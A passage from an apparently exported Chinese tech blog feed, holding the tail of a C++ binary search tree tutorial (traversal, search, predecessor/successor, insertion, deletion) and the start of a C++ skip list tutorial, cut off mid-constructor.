<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> binaryTree&lt;T&gt;::PostOrder(binaryTree::NODE *pRootNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(pRootNode== <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PostOrder(pRootNode-&gt;left_nodes);</span><br><span class="line">    PostOrder(pRootNode-&gt;right_nodes);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pRootNode-&gt;key&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="层级遍历"><a href="#层级遍历" class="headerlink" title="层级遍历"></a>层级遍历</h5><p>主要是利用广度优先搜索实现的<br><img src="/uploads/images/data_structure/bst_cpp/07.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> binaryTree&lt;T&gt;::LevelOrder(binaryTree::NODE *pRootNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!pRootNode)<span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;binaryTree::PNODE&gt;q;</span><br><span class="line">    q.push(pRootNode);</span><br><span class="line">    <span class="keyword">while</span> (!q.empty())&#123;</span><br><span class="line">        binaryTree::PNODE pNode=q.front();</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;pNode-&gt;key&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 左子树存在，先处理左边</span></span><br><span class="line">        <span class="keyword">if</span>(pNode-&gt;left_nodes)&#123;</span><br><span class="line">            q.push(pNode-&gt;left_nodes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 右子树存在，在处理右边</span></span><br><span class="line">        <span class="keyword">if</span>(pNode-&gt;right_nodes) &#123;</span><br><span class="line">            q.push(pNode-&gt;right_nodes);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 处理下一个节点</span></span><br><span class="line">        q.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="高度"><a href="#高度" class="headerlink" title="高度"></a>高度</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">int</span> binaryTree&lt;T&gt;::Height(binaryTree::PNODE pNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> h1=Height(pNode-&gt;left_nodes);</span><br><span class="line">    <span class="keyword">int</span> h2=Height(pNode-&gt;right_nodes);</span><br><span class="line">    <span class="comment">// 高度从0开始计数，因此高度要加1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::max(h1,h2)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>bst查找类似<strong>二分查找</strong>。很简单</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">NodeEntry&lt;T&gt; *binaryTree&lt;T&gt;::Search(PNODE pNode,const_key_type key) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>(pNode-&gt;key==key)&#123;</span><br><span class="line">        <span class="keyword">return</span> pNode;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key&lt;pNode-&gt;key)&#123;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="keyword">return</span> Search(pNode-&gt;left_nodes,key);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key&gt;pNode-&gt;key)&#123;</span><br><span class="line">        <span class="comment">//right</span></span><br><span class="line">        <span class="keyword">return</span> Search(pNode-&gt;right_nodes,key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="前驱-后继节点"><a href="#前驱-后继节点" class="headerlink" title="前驱/后继节点"></a>前驱/后继节点</h4><p>要完成bst的删除操作，那么就必须要知道前驱/后继节点怎么找。<br><strong>前驱节点</strong>： 假设存在一个节点N，那么它的前驱节点就是<strong>关键字</strong>小于N的且最大的节点。即$key[max(predecessor)]&lt;key[N]$</p>
<p><strong>后继节点</strong>： 假设存在一个节点N，那么它的后继节点就是<strong>关键字</strong>大于N的且最小的节点。即$key[min(successor)]&gt;key[N]$</p>
<p>根据前驱节点定义查找：</p>
<ul>
<li>若节点N<strong>有左子树L</strong>：且左子树L的右子树存在，则依次遍历L的右子树直到<strong>叶子节点</strong>，就是前驱节点；否则该左子树L就是前驱节点</li>
<li>若节点N<strong>无左子树</strong>，但节点N是其父节点P的<strong>右孩子</strong>，那么父节点P就是该节点N的前驱结点</li>
<li>若节点N<strong>无左子树</strong>，但该节点N是其父节点P的<strong>左孩子</strong>，那么需要沿着父亲节点P一直向树的顶端寻找，<strong>直到找到一个节点X是其父节点M的右孩子</strong>，则节点M为前驱节点</li>
</ul>
<p>以上三种情况分别对应下图<br><img src="/uploads/images/data_structure/bst_cpp/08.png" alt></p>
<p>后继节点查找类似前驱节点</p>
<ul>
<li>若节点N<strong>有右子树R</strong>：且右子树R的左子树存在，则依次遍历R的左子树直到<strong>叶子节点</strong>，就是后继节点；否则该右子树R就是后继节点</li>
<li>若节点N<strong>无右子树</strong>，但节点N是其父节点P的<strong>左孩子</strong>，那么父节点P就是该节点N的后继结点</li>
<li>若节点N<strong>无右子树</strong>，但该节点N是其父节点P的<strong>右孩子</strong>，那么需要沿着父亲节点P一直向树的顶端寻找，<strong>直到找到一个节点X是其父节点M的左孩子</strong>，则节点M为后继节点</li>
</ul>
<p><img src="/uploads/images/data_structure/bst_cpp/09.png" alt></p>
<p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::predecessor(NODE* pNode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 如果存在左子树</span></span><br><span class="line">    <span class="keyword">if</span> (pNode-&gt;left_nodes)&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=pNode-&gt;left_nodes;</span><br><span class="line">        <span class="keyword">while</span> (x-&gt;right_nodes)&#123;</span><br><span class="line">            x=x-&gt;right_nodes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pNode-&gt;parent)&#123;</span><br><span class="line">        <span class="comment">// 该节点为父节点的右孩子</span></span><br><span class="line">        <span class="keyword">if</span> (pNode-&gt;parent-&gt;right_nodes==pNode)&#123;</span><br><span class="line">            <span class="keyword">return</span> pNode-&gt;parent;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 该节点为父节点的左孩子</span></span><br><span class="line">            NodeEntry&lt;T&gt;* parent=pNode-&gt;parent;</span><br><span class="line">            <span class="comment">// 向父节点方向遍历</span></span><br><span class="line">            <span class="keyword">while</span> (parent &amp;&amp; parent-&gt;left_nodes==pNode)&#123;</span><br><span class="line">                pNode=parent;</span><br><span class="line">                parent=parent-&gt;parent;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> parent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">NodeEntry&lt;T&gt;* binaryTree&lt;T&gt;::successor(NODE* pNode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 如果存在右子树</span></span><br><span class="line">    <span class="keyword">if</span> (pNode-&gt;right_nodes)&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=pNode-&gt;right_nodes;</span><br><span class="line">        <span class="keyword">while</span> (x-&gt;left_nodes)&#123;</span><br><span class="line">            x=x-&gt;left_nodes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="comment">// 右子树不存在</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pNode-&gt;parent)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pNode-&gt;parent-&gt;left_nodes==pNode)&#123;</span><br><span class="line">            <span class="keyword">return</span> pNode-&gt;parent;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            NodeEntry&lt;T&gt;* parent=pNode-&gt;parent;</span><br><span class="line">            <span class="keyword">while</span> (parent &amp;&amp; parent-&gt;right_nodes==pNode)&#123;</span><br><span class="line">                pNode=parent;</span><br><span class="line">                parent=parent-&gt;parent;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> parent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>讲完前驱后继的查找后，接下来是插入操作，bst的插入比较简单，也就是在<strong>空节点nullptr</strong>处更新一个新节点，插入方法类似查找方法。插入操作要保证key的唯一性</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> binaryTree&lt;T&gt;::Insert(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value) &#123;</span><br><span class="line">    <span class="comment">// 表示当前为空节点</span></span><br><span class="line">    <span class="keyword">if</span>(pNode == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="comment">// 新建一个待插入的节点</span></span><br><span class="line">        pNode=<span class="keyword">new</span> NODE();</span><br><span class="line">        pNode-&gt;key=key;</span><br><span class="line">        pNode-&gt;left_nodes= <span class="literal">nullptr</span>;</span><br><span class="line">        pNode-&gt;right_nodes= <span class="literal">nullptr</span>;</span><br><span class="line">        pNode-&gt;data=value;</span><br><span class="line">        pNode-&gt;parent=pNodeParent;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key &lt; pNode-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">return</span> Insert(pNode-&gt;left_nodes,pNode,key,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; pNode-&gt;key)&#123;</span><br><span class="line">        <span class="keyword">return</span> Insert(pNode-&gt;right_nodes,pNode,key,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 已经存在了</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Already exist!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>删除操作就有点复杂了，不过照着思路也很容易写出来。<br>大致分为三类</p>
<ul>
<li>删除叶子结点</li>
<li>删除只有一棵子树的节点</li>
<li>删除有两棵子树的节点</li>
</ul>
<p><strong>注意：删除操作一定要维护二叉查找树的性质！！！</strong></p>
<p>删除叶子结点，这类情况最为简单，找到待删除节点后直接delete，同时更新父子节点关系；<br>删除有两棵子树的节点的操作可以转化为删除只有一棵子树的节点，转化策略有<strong>前驱</strong>和<strong>后继</strong>两种，本文删除节点使用的策略为后继法。</p>
<p>首先来看一下这个例子<br><img src="/uploads/images/data_structure/bst_cpp/10.png" alt><br>删除key=8的节点，不一定真的是删除该节点，不然的话还要重新建立父子节点关系以及维护bst的性质。因此，利用前驱/后继节点的方法可以巧妙的避开这些不必要的麻烦：只需要<strong>替换</strong>待删除节点和前驱/后继节点的数据，然后利用删除只有一棵子树的节点的方法来<strong>删除</strong>前驱/后继节点即可。</p>
<p>删除只有一棵子树的节点情况如下<br><img src="/uploads/images/data_structure/bst_cpp/11.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">binaryTree</span>&lt;T&gt;:</span>:Delete(PNODE pNode,const_key_type key) &#123;</span><br><span class="line">    PNODE  pDeletenode = <span class="keyword">this</span>-&gt;Search(pNode,key);</span><br><span class="line">    <span class="keyword">if</span>(!pDeletenode) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 节点的左右子树都存在情况下，此时将其转化为其他两种情况</span></span><br><span class="line">    <span class="keyword">if</span>(pDeletenode-&gt;left_nodes!=<span class="literal">nullptr</span>&amp;&amp;pDeletenode-&gt;right_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        PNODE successor=<span class="keyword">this</span>-&gt;successor(pDeletenode);</span><br><span class="line">        <span class="comment">// 只需要交换数据</span></span><br><span class="line">        pDeletenode-&gt;key=successor-&gt;key;</span><br><span class="line">        pDeletenode-&gt;data=successor-&gt;data;</span><br><span class="line">        <span class="comment">// 标记pDeletenode为后继节点，</span></span><br><span class="line">        pDeletenode=successor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 是否有子节点</span></span><br><span class="line">    PNODE child=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        80              80</span></span><br><span class="line"><span class="comment">        /                 \ </span></span><br><span class="line"><span class="comment">       70[delete]         86[delete]</span></span><br><span class="line"><span class="comment">        \                   \</span></span><br><span class="line"><span class="comment">         75                  90</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="comment">// 删除只有一棵子树的情况</span></span><br><span class="line">   <span class="comment">// 判断待删除节点的子节点左右孩子</span></span><br><span class="line">    <span class="keyword">if</span>(pDeletenode-&gt;left_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        child=pDeletenode-&gt;left_nodes;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        child=pDeletenode-&gt;right_nodes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(child!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        child-&gt;parent=pDeletenode-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">情况1           情况2               情况3               情况4</span></span><br><span class="line"><span class="comment">         9               9                  9               9</span></span><br><span class="line"><span class="comment">        /               /                  /               / </span></span><br><span class="line"><span class="comment">       7                7                 7[delete]        7[delete]</span></span><br><span class="line"><span class="comment">      /                  \               /                  \</span></span><br><span class="line"><span class="comment">     6[delete]           8[delete]      6                    8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">情况5           情况6               情况7               情况8</span></span><br><span class="line"><span class="comment">      1                1                 1              1</span></span><br><span class="line"><span class="comment">       \                \                 \              \ </span></span><br><span class="line"><span class="comment">       7                 7                 7[delete]      7[delete]</span></span><br><span class="line"><span class="comment">      /                  \                /                \</span></span><br><span class="line"><span class="comment">     6[delete]           8[delete]       6                  8</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除的是根节点</span></span><br><span class="line">    <span class="keyword">if</span>(pDeletenode-&gt;parent==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        m_NodeRoot=child;</span><br><span class="line">    <span class="comment">// 判断待删除节点是其父节点的左右孩子</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pDeletenode-&gt;parent-&gt;left_nodes==pDeletenode)&#123;</span><br><span class="line">        pDeletenode-&gt;parent-&gt;left_nodes=child;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pDeletenode-&gt;parent-&gt;right_nodes=child;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> pDeletenode;</span><br><span class="line">    pDeletenode=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bst释放"><a href="#bst释放" class="headerlink" title="bst释放"></a>bst释放</h4><p>递归方式释放所有节点</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> binaryTree&lt;T&gt;::ClearAll(binaryTree::REF_PNODE pNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span>;</span><br><span class="line">    ClearAll(pNode-&gt;left_nodes);</span><br><span class="line">    ClearAll(pNode-&gt;right_nodes);</span><br><span class="line">    <span class="keyword">delete</span> pNode;</span><br><span class="line">    pNode= <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ok，基本上bst大致讲完了，bye~</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-跳跃表C++实现</title>
    <url>/skiplist-cpp/</url>
    <content><![CDATA[<p>跳跃表/跳表(SkipList)<br>In computer science, a skip list is a data structure that allows $O(\log n)$ search complexity as well as $O(\log n)$ insertion complexity within an ordered sequence of $n$ elements.  —— 维基百科</p>
<a id="more"></a>

<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>由于本人知识有限，对于跳跃表的认识可能不够深入，不过还是想把自己的看法写下来……初学跳跃表时也许无法理解，不过当深入理解了跳跃表的原理时，一切都变得easy。比起手写一个红黑树代码跳跃表要简单得多，而且跳跃表也有很多实现例子的，如 Qt中的 <a href="https://doc.qt.io/archives/qt-4.8/qmap.html#details" target="_blank" rel="noopener">QMap</a> ,MemSQL ,Redis… 虽然我都没有接触过…</p>
<h3 id="跳跃表"><a href="#跳跃表" class="headerlink" title="跳跃表"></a>跳跃表</h3><p>一个简单的跳跃表结构<br><img src="/uploads/images/data_structure/skiplist_cpp/01.png" alt></p>
<p><img src="/uploads/images/data_structure/skiplist_cpp/03.png" alt></p>
<p>我们都知道，对一个 <code>有序链表</code> 执行查找的复杂度为 $O(n)$ ,而对数组使用<strong>二分查找</strong>的复杂度则是 $O(\log n)$，而跳跃表的出现就是为了解决<code>有序链表</code>的查找问题(当然还要其他更重要的作用)，使其复杂度将为 $O(\log n)$ ，不过最坏情况下却仍是$O(n)$<br>注意: 跳跃表适用于有序链表。</p>
<p>利用跳跃表之后的查找、插入、删除复杂度如下</p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">查找</th>
<th align="center">插入</th>
<th align="center">删除</th>
</tr>
</thead>
<tbody><tr>
<td align="center">平均情况</td>
<td align="center">$O(\log n)$</td>
<td align="center">$O(\log n)$</td>
<td align="center">$O(\log n)$</td>
</tr>
<tr>
<td align="center">最坏情况</td>
<td align="center">$O(n)$</td>
<td align="center">$O(n)$</td>
<td align="center">$O(n)$</td>
</tr>
</tbody></table>
<p>跳跃表是一个空间换时间的数据结构。</p>
<p>那么跳跃表是如何实现快速查找的呢？跳跃表通过建立 <code>索引节点</code> ，每次查找时，先通过最顶层索引节点一层层的向下寻找满足条件的节点，每次查找都有可能跨越到其他不相邻的节点，直到抵达最底层也就是原始层链表某处节点位置。</p>
<p>这里的 <strong>索引节点</strong> 其实就是一组节点地址，在new一个新节点时就分配好，然后在对每一层索引节点进行重组，使其前后串联起来，这样就形成了一个 $i$级链表且 $i\in(0,M-1)$ M为跳跃表的最高层级数MaxLevel，这样每一层级均可形成一条链。</p>
<p>要查找key为5的节点，那么从head开始一层层的查找，此次过程跳过了节点1和节点3，最后找到了节点5。<br><img src="/uploads/images/data_structure/skiplist_cpp/02.png" alt></p>
<p>这里我们设置一个有序链表为带有head和tail节点，其中head节点的next指针就是有序链表的起始，而tail节点一般为<code>nullptr</code>，不过这里我们将tail作为<code>哨兵节点</code>，这样就无需处理<code>nullptr</code>问题了。</p>
<h4 id="插入-删除"><a href="#插入-删除" class="headerlink" title="插入/删除"></a>插入/删除</h4><p>在一个<code>规则跳表结构</code>中，$i$级链表有 $\frac{n}{2^i}$ 个节点，$n$为最底层链表的总节点数。如:<br>$0 \rightarrow i$ 层有 $n,\frac{n}{2},\frac{n}{4},\cdots,\frac{n}{2^{i}}$</p>
<p>也就是说，我们希望在插入时符合这种结构，而插入的节点属于$i$级链表的概率为 $\frac{1}{2^i}$ (不难想出，插入节点属于0级链表概率永远为1，而属于1级链表的概率为$\frac{1}{2}$，$\cdots$，属于$i$级链表的为$\frac{1}{2^i}$)</p>
<p>这时来看看这段话，摘自William Pugh(就是他搞出了跳表)写的论文里的一段话。<br>文末参考中有他关于跳表的论文</p>
<blockquote>
<p>原文<br>Skip lists are a data structure that can be used in place of balanced trees.<br>Skip lists use probabilistic balancing rather than strictly enforced balancing<br>and as a result the algorithms for insertion and deletion in skip lists are<br>much simpler and significantly faster than equivalent algorithms for<br>balanced trees.<br>翻译:<br>跳跃表是一种可以用来代替平衡树的数据结构。<strong>跳跃表使用概率平衡而不是严格执行的平衡</strong>。因此，在跳跃表中插入和删除的算法是要比等效算法简单得多，也快得多平衡树。</p>
</blockquote>
<p>注意 <code>跳跃表使用概率平衡而不是严格执行的平衡</code> 这告诉我们，插入操作是动态的插入到不同层级的位置。因此，把一个新节点插入到$i$级链表的概率为$p^i$ (在一个规则跳表结构中，$p=0.5$ )。</p>
<p>而这个动态插入法就利用到 随机数生成函数 来完成，一个好的随机数生成函数，能够使跳表结构达到最优的效果使其复杂度不会太高。  </p>
<p>除此之外每一次插入/删除操作，都必须要维护跳表结构，也就是处理好链表节点的指向关系，避免混乱。</p>
<h4 id="级的分配"><a href="#级的分配" class="headerlink" title="级的分配"></a>级的分配</h4><p>不说那么多，级的分配可以利用一个随机数生成函数来完成。<br>伪码:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">randomLevel()</span><br><span class="line">    lvl := <span class="number">1</span></span><br><span class="line">    -- random() that returns a random value in [<span class="number">0.</span>.<span class="number">.1</span>)</span><br><span class="line">    <span class="keyword">while</span> random() &lt; p <span class="keyword">and</span> lvl &lt; MaxLevel <span class="keyword">do</span></span><br><span class="line">        lvl := lvl + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lvl</span><br></pre></td></tr></table></figure>

<p>转化成C++代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">random_level</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> level= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (((<span class="keyword">double</span>)(rand()%<span class="number">101</span>)/<span class="number">101</span>) &lt; (m_prob) </span><br><span class="line">    &amp;&amp; level &lt; m_maxLevel) &#123;</span><br><span class="line">        level++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里还要一个糟糕的随机数生成函数仅供参考</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">random_level</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> level = rand() % m_maxLevel + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="C-实现跳跃表"><a href="#C-实现跳跃表" class="headerlink" title="C++实现跳跃表"></a>C++实现跳跃表</h3><p>OK，现在开始用C++实现跳跃表<br>首先我们定义两个结构体，用于保存节点数据</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">Element</span>&#123;</span></span><br><span class="line">    KeyType key;</span><br><span class="line">    ValueType value;</span><br><span class="line">    Element()&#123;&#125;</span><br><span class="line">    Element(KeyType key,<span class="keyword">const</span> ValueType&amp; value)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;key=key;</span><br><span class="line">        <span class="keyword">this</span>-&gt;value=value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">skipNode</span>&#123;</span></span><br><span class="line">    Element&lt;KeyType,ValueType&gt; element;</span><br><span class="line">    skipNode**next;</span><br><span class="line">    skipNode(<span class="keyword">const</span> Element&lt;KeyType,ValueType&gt;&amp;theElement,<span class="keyword">int</span> size)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;element=theElement;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next=<span class="keyword">new</span> skipNode&lt;KeyType,ValueType&gt;*[size];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="确定MaxLevel"><a href="#确定MaxLevel" class="headerlink" title="确定MaxLevel"></a>确定MaxLevel</h4><p>MaxLevel太大，造成空间的浪费，太小又会导致退化成一个冗杂的 ‘单链表’ 结构，两者均会影响跳跃表的性能。因此合适的MaxLevel十分重要。</p>
<p>从《Skip Lists: A Probabilistic Alternative to<br>Balanced Trees》 中我们可以这样定义一个MaxLevel，即<br>$L(n)=\lceil log_\frac{1}{p}n \rceil$<br>$MaxLevel=L(N),N$为待插入元素节点总数 </p>
<p>利用换底公式 $\log_ab=\frac{\log_cb}{\log_ca}$ 转化为C++代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MaxLevel</span><span class="params">(<span class="keyword">int</span> numberOfnode,<span class="keyword">float</span> prob)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(<span class="built_in">ceil</span>(logf((<span class="keyword">float</span>)numberOfnode)/logf((<span class="keyword">float</span>)<span class="number">1</span>/prob)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="skiplist初始化"><a href="#skiplist初始化" class="headerlink" title="skiplist初始化"></a>skiplist初始化</h4><p>我们只需在构造函数进行初始化即可。<br>这里我们既可以自定义跳跃表的<code>MaxLevel</code>，也可以通过<code>numberOfnode</code>来计算一个<code>MaxLevel</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">KeyType</span>,<span class="title">class</span> <span class="title">ValueType</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">skiplist</span>&lt;KeyType,ValueType&gt;:</span>:skiplist(<span class="keyword">float</span> prob,KeyType tailLargeKey,<span class="keyword">int</span> max_level,<span class="keyword">int</span> numberOfnode) &#123;</span><br><span class="line">    srand(time(<span class="literal">nullptr</span>));</span><br><span class="line">    m_prob=prob;</span><br><span class="line">    m_size=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算最大链表层数</span></span><br><span class="line">    <span class="keyword">if</span>(numberOfnode!=<span class="number">-1</span>)</span><br><span class="line">        m_maxLevel=MaxLevel(numberOfnode,prob);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m_maxLevel=max_level;</span><br><span class="line">        </span><br><span class="line">    m_curMaxLevel=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化尾节点</span></span><br><span class="line">    m_tailKey=tailLargeKey;</span><br><span class="line">    Element&lt;KeyType,ValueType&gt;tailPair&#123;m_tailKey,<span class="number">0</span>&#125;;</span><br><span class="line">    m_tailNode=<span class="keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(tailPair,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化头结点</span></span><br><span class="line">    m_headNode=<span class="keyword">new</span> skipNode&lt;KeyType,ValueType&gt;(tailPair,m_maxLevel);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m_maxLevel; i++)&#123;</span><br><span class="line">        m_headNode-&gt;next[i]=m_tailNode;</span><br><span class="line">    &#125;</span><br><span class="line">    m_forwardNodes=<span class="keyword">new</span> 